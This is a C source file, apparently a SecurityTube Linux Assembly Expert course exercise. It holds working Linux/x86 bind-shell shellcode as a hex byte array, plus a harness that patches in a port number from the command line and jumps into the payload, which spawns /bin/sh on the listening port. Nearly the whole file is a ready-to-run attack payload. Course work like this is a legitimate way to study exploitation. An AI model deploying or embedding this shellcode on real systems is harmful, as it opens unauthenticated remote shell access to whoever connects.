// Linux/x86 Shell Bind TCP assembly shellcode
// Author SLAE - 926 for SecurityTube Linux Assembly Expert course

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>

unsigned char shellcode[] = \
"\x66\xbd"
"\x15\xb3" // <- Port number 5555 (2 bytes) 
"\x31\xc0\x50\x40\x50\x5b\x50\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x96\x6a\x04\x54\x6a\x02\x53\x56\xb3\x0e\xb0\x66\x89\xe1\xcd\x80\x31\xd2\x52\x66\x55\xb3\x02\x66\x53\x89\xe1\x6a\x10\x51\x56\xb0\x66\x89\xe1\xcd\x80\x50\x56\xb3\x04\xb0\x66\x89\xe1\xcd\x80\x43\xb0\x66\x89\xe1\xcd\x80\x93\x87\xce\x49\xb0\x3f\xcd\x80\x75\xf9\x31\xc0\x50\x50\x59\x5a\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x87\xe3\xcd\x80";

static bool zeroes(void) {
	for(int i = 0; i < sizeof(shellcode)-1; i++) {
        if (shellcode[i] == '\x00')
            return true;
        }
    return false;
}

int main (int argc, char *argv[]){

	if (argc > 2) {
		printf("Too many arguments\n");
		return 1;
		}
	
	else if (argc == 2 ) { 
		int port = strtol(argv[1], NULL, 10);

		if (port<1024 || port>65535){
			printf("Invalid port, port must be between 1024 and 65535\n");
			return 1;
			}
		*(short *)(shellcode+2) = port; // convert to hex
		char tmp = shellcode[2];
		shellcode[2] = shellcode[3];
		shellcode[3] = tmp;

		if (shellcode[2] == '\x00' || shellcode[21] == '\x00') {
			printf("Invalid port when converted to hex\n");
			return 1;
		}
		if (zeroes()){
			printf("shellcode contains zeroes\n");
			return 1;
		} 
		printf("Binding port %d\n",port);
		goto SHELLCALL;
	}
	else {
		printf("Usage: ./bind <port>\n");
		printf("No valid port provided, binding port 5555\n");
		SHELLCALL:
		__asm__ (
		"xorl %eax, %eax\n\t"
		"xorl %ebx, %ebx\n\t"
		"xorl %ecx, %ecx\n\t"
		"xorl %edx, %edx\n\t"
		"xorl %edi, %edi\n\t"
		"xorl %esi, %esi\n\t"
		"xorl %ebp, %ebp\n\t"
		
		"jmp shellcode");
	}
	
}

